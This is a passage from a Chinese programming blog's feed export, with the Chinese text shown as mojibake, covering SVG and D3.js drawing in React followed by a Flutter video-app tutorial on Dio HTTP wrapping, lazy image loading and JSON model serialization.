class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3ã€æ–‡æœ¬ç‚¹å‡»è·³è½¬</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://www.w3schools.com/svg/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span>I love SVG<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç« èŠ‚å°ç»“"><a href="#ç« èŠ‚å°ç»“" class="headerlink" title="ç« èŠ‚å°ç»“"></a>ç« èŠ‚å°ç»“</h5><p>åœ¨å­¦ä¹  <strong>D3.js</strong> æ—¶ï¼Œæˆ‘å…ˆè¿›è¡Œäº† <strong>svg</strong>  çš„äº†è§£ã€‚å¿«é€Ÿçš„å­¦ä¹ äº†<strong>svg</strong>çš„æ ‡ç­¾åŠå±æ€§ã€‚</p><h3 id="D3æ„é€ -å¤§é»„äºº"><a href="#D3æ„é€ -å¤§é»„äºº" class="headerlink" title="D3æ„é€ -å¤§é»„äºº"></a>D3æ„é€ -å¤§é»„äºº</h3><p>ä½¿ç”¨åˆ°çš„<strong>D3.js</strong> Api:</p><ul><li>select é€‰ä¸­å…ƒç´ </li><li>arc æ„é€ å¼§å‹</li><li>append æ·»åŠ æ–°çš„svgå…ƒç´ </li><li>attr è®¾ç½®å±æ€§</li><li>transition åŠ¨ç”»</li><li>duration æ—¶é—´</li></ul><p><a href="https://github.com/1160007652/react-d3/blob/master/src/page/example-1-emot/index.js">ç‚¹å‡»è·å– <strong>å®Œæ•´ç‰ˆ</strong> ä»£ç </a><br><a href="https://1160007652.github.io/react-d3">demo æ¼”ç¤º</a> è¿›å…¥ç‚¹å‡»èœå• <strong>å¤§é»„äºº</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; select, arc&#125; <span class="keyword">from</span> <span class="string">&#x27;d3&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmotSVG</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">props</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(props);</span><br><span class="line">        <span class="built_in">this</span>.refSvgDom = React.createRef();</span><br><span class="line">        <span class="built_in">this</span>.emotStyle = &#123;</span><br><span class="line">            emotWidth: <span class="number">900</span>,</span><br><span class="line">            emotHeight: <span class="number">500</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.svg = select(<span class="built_in">this</span>.refSvgDom.current);</span><br><span class="line">        <span class="built_in">this</span>.draw();</span><br><span class="line">    &#125;</span><br><span class="line">    draw () &#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; emotWidth, emotHeight &#125; = <span class="built_in">this</span>.emotStyle;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div className=<span class="string">&quot;example-emot&quot;</span>&gt;</span><br><span class="line">                &lt;svg  ref=&#123;<span class="built_in">this</span>.refSvgDom&#125; width=&#123;emotWidth&#125; height=&#123;emotHeight&#125; &gt;&lt;/svg&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> EmotSVG;</span><br></pre></td></tr></table></figure><p>åœ¨ç”»è¿™ä¸ªå¤§é»„äººæ—¶ï¼Œé‡åˆ°çš„é—®é¢˜</p><p>1ã€ é€‰æ‹©dom</p><blockquote><p>ä½¿ç”¨React æä¾›çš„ <strong>React.createRef()</strong> APi, è·å–Dom, å¹¶ä¸”å°†Domæä¾›ç»™D3ä½¿ç”¨ã€‚</p></blockquote><p>2ã€æŠŠç»˜åˆ¶å¤§é»„äººçš„æ–¹æ³•æŠ½ç¦»</p><blockquote><p>æä¾› draw() ç»˜åˆ¶æ–¹æ³•ã€‚</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> react </tag>
            
            <tag> d3 </tag>
            
            <tag> å¯è§†åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¹°çœ¼è§†é¢‘ (ä¸€)</title>
      <link href="posts/ab4a2db7/"/>
      <url>posts/ab4a2db7/</url>
      
        <content type="html"><![CDATA[<h2 id="Flutter-é¹°çœ¼è§†é¢‘"><a href="#Flutter-é¹°çœ¼è§†é¢‘" class="headerlink" title="Flutter - é¹°çœ¼è§†é¢‘"></a>Flutter - é¹°çœ¼è§†é¢‘</h2><p>é¹°çœ¼è§†é¢‘ App ç›¸å…³æŠ€æœ¯çŸ¥è¯†ç‚¹</p><img src="/posts/ab4a2db7/yyspflutterhome.png" class="" title="é¹°çœ¼è§†é¢‘"><ul><li>ç›®å½•ç»“æ„</li><li>é¡µé¢æ‹†å°</li><li>å°è£… dio &lt; Flutter http æ’ä»¶ &gt;</li><li>ä½¿ç”¨æ‡’åŠ è½½å›¾ç‰‡ç‰¹æ•ˆ</li><li>jsonè‡ªåŠ¨åºåˆ—åŒ– model æ˜ å°„</li><li>ListView ç»„ä»¶</li><li>GestureDetector æ‰‹åŠ¿</li><li>è·¯ç”±å¯¼èˆª</li><li>è§†é¢‘æ’­æ”¾</li></ul><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lib</span><br><span class="line">    comments    &#x2F;&#x2F; ç»„ä»¶å°è£…</span><br><span class="line">    model       &#x2F;&#x2F; åºåˆ—å·model</span><br><span class="line">    page        &#x2F;&#x2F; é¡µé¢</span><br><span class="line">    serves      &#x2F;&#x2F; http ç›¸å…³çš„ ç›®å½• </span><br><span class="line">    view        &#x2F;&#x2F; å­˜æ”¾ä¸€äº› ç»„ä»¶ç»„åˆçš„ æ§ä»¶</span><br><span class="line">    main.dart   &#x2F;&#x2F; Flutterå…¥å£dartæ–‡ä»¶ </span><br></pre></td></tr></table></figure> <a id="more"></a><h3 id="é¡µé¢æ‹†å°"><a href="#é¡µé¢æ‹†å°" class="headerlink" title="é¡µé¢æ‹†å°"></a>é¡µé¢æ‹†å°</h3><h4 id="main-dart-å…¥å£æ–‡ä»¶å†…å®¹"><a href="#main-dart-å…¥å£æ–‡ä»¶å†…å®¹" class="headerlink" title="main.dart å…¥å£æ–‡ä»¶å†…å®¹"></a>main.dart å…¥å£æ–‡ä»¶å†…å®¹</h4> <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/page/homePage.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flutter å…¥å£mainå‡½æ•°</span></span><br><span class="line"><span class="keyword">void</span> main()=&gt;runApp(<span class="keyword">new</span> RootPage());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RootPage</span> <span class="keyword">extends</span> <span class="title">StatelessWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">      title: <span class="string">&#x27;é¹°çœ¼è§†é¢‘&#x27;</span>,</span><br><span class="line">      home: <span class="keyword">new</span> HomePage()</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RootPageç»„ä»¶ç±»æ˜¯æ ¹å…¥å£,ç”¨äºæ±‡é›†æ‰€æœ‰çš„ pageé¡µé¢ã€‚åŒæ—¶é¡µé¢çš„è·¯ç”±é…ç½®å°±å¯ä»¥æ”¾åˆ°è¿™ä¸ªRootPageç±»ä¸­å»ç®¡ç†ã€‚</p><p>å¯¼å…¥å…¶ä»–æ–‡ä»¶æ—¶çš„2ä¸­æ–¹æ³•ï¼Œå¦‚ä¸‹ã€‚</p><blockquote><p>import â€˜package:yysp/page/homePage.dartâ€™;<br>import â€˜./page/homePage.dartâ€™;</p></blockquote><h4 id="homePage-dart-é¦–é¡µ"><a href="#homePage-dart-é¦–é¡µ" class="headerlink" title="homePage.dart é¦–é¡µ"></a>homePage.dart é¦–é¡µ</h4><p>è¯¥æ–‡ä»¶å­˜æ”¾åœ¨ ** /page/ ** ç›®å½•ä¸‹, ** page ** ç›®å½•ç”¨äºç®¡ç†æ‰€æœ‰çš„é¡µé¢èµ„æºã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  _HomePageState createState() =&gt; _HomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_HomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">HomePage</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            home: <span class="keyword">new</span> Scaffold(</span><br><span class="line">                appBar: AppBar(</span><br><span class="line">                    title: Text(</span><br><span class="line">                        <span class="string">&quot;é¹°çœ¼è§†é¢‘&quot;</span>,</span><br><span class="line">                        style: <span class="keyword">new</span> TextStyle(fontSize: <span class="number">20.0</span>, letterSpacing: <span class="number">3.0</span>),</span><br><span class="line">                    ),</span><br><span class="line">                ),</span><br><span class="line">                body: <span class="keyword">new</span> Text(<span class="string">&#x27;æˆ‘æ˜¯é¦–é¡µ&#x27;</span>),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæœ€åŸºæœ¬çš„æœ‰çŠ¶æ€ç»„ä»¶,æœ‰çŠ¶æ€ç»„ä»¶å¯ä»¥åšäº¤äº’ã€è®©ç»„ä»¶å¯æ§ã€‚å¦‚reactä¸­çš„ this.setState()åï¼Œç»„ä»¶å°±ä¼šé‡æ–°ç»˜åˆ¶ã€‚ä¸è¿‡Flutterä¸­çš„ä¿®æ”¹çŠ¶æ€å€¼çš„æ–¹æ³•æ˜¯ ** setState((){ }) ** ,ä¸React ä¸€æ ·ã€‚</p><h3 id="å°è£…è‡ªå·±çš„dio"><a href="#å°è£…è‡ªå·±çš„dio" class="headerlink" title="å°è£…è‡ªå·±çš„dio"></a>å°è£…è‡ªå·±çš„dio</h3><p>Api.dartã€httpUtil.dart æ–‡ä»¶éƒ½å­˜æ”¾åœ¨ ** /servers/**ç›®å½•ä¸‹ã€‚</p><p>Api.dart æ–‡ä»¶å†…å®¹</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Api</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸºç¡€ Url</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">String</span> BaseUrl = <span class="string">&#x27;https://436086407.dmi.net.cn/weapp/&#x27;</span>;</span><br><span class="line">    <span class="comment">// è§†é¢‘åˆ—è¡¨</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">String</span> VideList = <span class="string">&#x27;<span class="subst">$BaseUrl</span>/videolist&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>httpUtil.dart æ–‡ä»¶å†…å®¹</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:dio/dio.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/Api.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HttpUtil</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> HttpUtil instance;</span><br><span class="line">  Dio dio;</span><br><span class="line">  Options options;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> HttpUtil getInstance() &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;getInstance&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">      instance = <span class="keyword">new</span> HttpUtil();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  HttpUtil() &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;dioèµ‹å€¼&#x27;</span>);</span><br><span class="line">    options = Options(</span><br><span class="line">      baseUrl: Api.BaseUrl,</span><br><span class="line">      connectTimeout: <span class="number">10000</span>,</span><br><span class="line">      receiveTimeout: <span class="number">3000</span>,</span><br><span class="line">      headers: &#123;&#125;,</span><br><span class="line">    );</span><br><span class="line">    dio = <span class="keyword">new</span> Dio(options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span>(url, &#123;data, options, cancelToken&#125;) <span class="keyword">async</span> &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;getè¯·æ±‚å¯åŠ¨! urlï¼š<span class="subst">$url</span> ,body: <span class="subst">$data</span>&#x27;</span>);</span><br><span class="line">    Response response;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="keyword">await</span> dio.<span class="keyword">get</span>(</span><br><span class="line">        url,</span><br><span class="line">        data: data,</span><br><span class="line">        cancelToken: cancelToken,</span><br><span class="line">      );</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;getè¯·æ±‚æˆåŠŸ!response.dataï¼š<span class="subst">$&#123;response.data&#125;</span>&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">on</span> DioError <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">if</span> (CancelToken.isCancel(e)) &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;getè¯·æ±‚å–æ¶ˆ! &#x27;</span> + e.message);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;getè¯·æ±‚å‘ç”Ÿé”™è¯¯ï¼š<span class="subst">$e</span>&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response.data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  post(url, &#123;data, options, cancelToken&#125;) <span class="keyword">async</span> &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;postè¯·æ±‚å¯åŠ¨! urlï¼š<span class="subst">$url</span> ,body: <span class="subst">$data</span>&#x27;</span>);</span><br><span class="line">    Response response;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="keyword">await</span> dio.post(</span><br><span class="line">        url,</span><br><span class="line">        data: data,</span><br><span class="line">        cancelToken: cancelToken,</span><br><span class="line">      );</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;postè¯·æ±‚æˆåŠŸ!response.dataï¼š<span class="subst">$&#123;response.data&#125;</span>&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">on</span> DioError <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">if</span> (CancelToken.isCancel(e)) &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;postè¯·æ±‚å–æ¶ˆ! &#x27;</span> + e.message);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;postè¯·æ±‚å‘ç”Ÿé”™è¯¯ï¼š<span class="subst">$e</span>&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response.data;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒhttpUtilç±»ï¼Œé‡‡ç”¨äº†å•åˆ—æ¨¡å¼ã€‚å¯ä»¥æƒ³ä¸€ä¸‹ ** java ** ä¸­è¿æ¥æ•°æ®åº“JDBCçš„æƒ…æ™¯ã€‚</p><h3 id="ä½¿ç”¨æ‡’åŠ è½½å›¾ç‰‡ç‰¹æ•ˆ"><a href="#ä½¿ç”¨æ‡’åŠ è½½å›¾ç‰‡ç‰¹æ•ˆ" class="headerlink" title="ä½¿ç”¨æ‡’åŠ è½½å›¾ç‰‡ç‰¹æ•ˆ"></a>ä½¿ç”¨æ‡’åŠ è½½å›¾ç‰‡ç‰¹æ•ˆ</h3><p>å®ç°è¿™ä¸ªæ•ˆæœï¼Œéœ€è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„æ’ä»¶ã€‚ åœ¨ ** pubspec.yaml ** ä¸­æ·»åŠ ã€‚</p><p>Flutterä¸node ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“çš„åŒºåˆ«ã€‚</p><ul><li>node å¯ä»¥ npm i xxx ,ä¹Ÿå¯ä»¥åœ¨package ä¸­ç›´æ¥å†™åº“åï¼Œç„¶åæ‰§è¡Œ npm iã€‚</li><li>flutter éœ€è¦æ‰‹åŠ¨å†™åˆ° pubspec.yamlä¸­ï¼Œåœ¨æ‰§è¡Œ flutter packages get ã€‚</li></ul><p>åŠ è½½å›¾ç‰‡ç‰¹æ•ˆæ’ä»¶ï¼štransparent_image</p><p>å°è£…å›¾ç‰‡ç»„ä»¶ï¼Œä»£ç ç¤ºæ„å›¾</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å›¾ç‰‡æ‡’æƒ°åŠ è½½</span></span><br><span class="line">Widget _buildImage(<span class="built_in">String</span> imgUrl) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FadeInImage.memoryNetwork(</span><br><span class="line">        placeholder: kTransparentImage,</span><br><span class="line">        image: imgUrl,</span><br><span class="line">        height: <span class="number">200.0</span>,</span><br><span class="line">        fit: BoxFit.fitWidth,</span><br><span class="line">        fadeInDuration: <span class="keyword">const</span> <span class="built_in">Duration</span>(milliseconds: <span class="number">300</span>),</span><br><span class="line">        fadeOutDuration: <span class="keyword">const</span> <span class="built_in">Duration</span>(milliseconds: <span class="number">300</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="jsonè‡ªåŠ¨åºåˆ—åŒ–-model-æ˜ å°„"><a href="#jsonè‡ªåŠ¨åºåˆ—åŒ–-model-æ˜ å°„" class="headerlink" title="jsonè‡ªåŠ¨åºåˆ—åŒ– model æ˜ å°„"></a>jsonè‡ªåŠ¨åºåˆ—åŒ– model æ˜ å°„</h3><p>æˆ‘ä»¬åœ¨å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®åï¼ŒæœåŠ¡å™¨å¾€å¾€ä¼šè¿”å›ä¸€æ®µjsonå­—ç¬¦ä¸²ã€‚è€Œæˆ‘ä»¬è¦æƒ³æ›´åŠ çµæ´»çš„ä½¿ç”¨æ•°æ®çš„è¯éœ€è¦æŠŠjsonå­—ç¬¦ä¸²è½¬åŒ–æˆå¯¹è±¡ã€‚ç”±äºflutteråªæä¾›äº†json to Mapã€‚è€Œæ‰‹å†™ååºåˆ—åŒ–åœ¨å¤§å‹é¡¹ç›®ä¸­æä¸ç¨³å®šï¼Œå¾ˆå®¹æ˜“å¯¼è‡´è§£æå¤±è´¥ã€‚æ‰€ä»¥flutterå›¢é˜Ÿæ¨èä½¿ç”¨json_serializable è‡ªåŠ¨ååºåˆ—åŒ–ã€‚</p><p>ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼š json_annotation: ^2.0.0 \ build_runner \ json_serializable</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dependencies:</span><br><span class="line">  flutter:</span><br><span class="line">    sdk: flutter</span><br><span class="line">  json_annotation: ^<span class="number">2.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">dev_dependencies:</span><br><span class="line">  flutter_test:</span><br><span class="line">    sdk: flutter</span><br><span class="line">  build_runner: ^<span class="number">1.1</span><span class="number">.0</span></span><br><span class="line">  json_serializable: ^<span class="number">2.0</span><span class="number">.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="flutterä¸­å¦‚ä½•è§£æjsonå¯¹è±¡"><a href="#flutterä¸­å¦‚ä½•è§£æjsonå¯¹è±¡" class="headerlink" title="flutterä¸­å¦‚ä½•è§£æjsonå¯¹è±¡"></a>flutterä¸­å¦‚ä½•è§£æjsonå¯¹è±¡</h4><p>å‡å¦‚æˆ‘ä»¬çš„mockæ•°æ®æ˜¯å¦‚ä¸‹å½¢å¼ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;id&quot;</span> : <span class="number">8863</span>,</span><br><span class="line">    <span class="attr">&quot;list&quot;</span> : [ <span class="number">8952</span>, <span class="number">9224</span>, <span class="number">8917</span> ],</span><br><span class="line">    <span class="attr">&quot;score&quot;</span> : <span class="number">111</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ ¹æ®ç›¸åº”çš„jsonæ•°æ®å»åˆ›å»ºå¯¹åº”çš„modelå®ä½“ç±»</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:json_annotation/json_annotation.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span></span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">int</span> id;</span><br><span class="line">  <span class="meta">@JsonKey</span>(name: <span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; listData;</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">int</span> score;</span><br><span class="line"></span><br><span class="line">  Data(&#123;<span class="keyword">this</span>.id, <span class="keyword">this</span>.listData, <span class="keyword">this</span>.score&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä½¿ç”¨äº† ** @JsonKey(name: â€˜list) ** ,åŸå› æ˜¯ï¼Œå› ä¸ºæˆ‘ä»¬çš„jsonæ•°æ®ä¸­ä½¿ç”¨äº†listå…³é”®å­—,æ‰€ä»¥æˆ‘ä»¬ç»™èµ·ä¸ªåˆ«ålistDataã€‚å¹¶ä¸”ä¸Jsonçš„listå­—æ–­æ˜ å°„ï¼</p><h4 id="ç”ŸæˆJsonè§£ææ–‡ä»¶"><a href="#ç”ŸæˆJsonè§£ææ–‡ä»¶" class="headerlink" title="ç”ŸæˆJsonè§£ææ–‡ä»¶"></a>ç”ŸæˆJsonè§£ææ–‡ä»¶</h4><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ ** 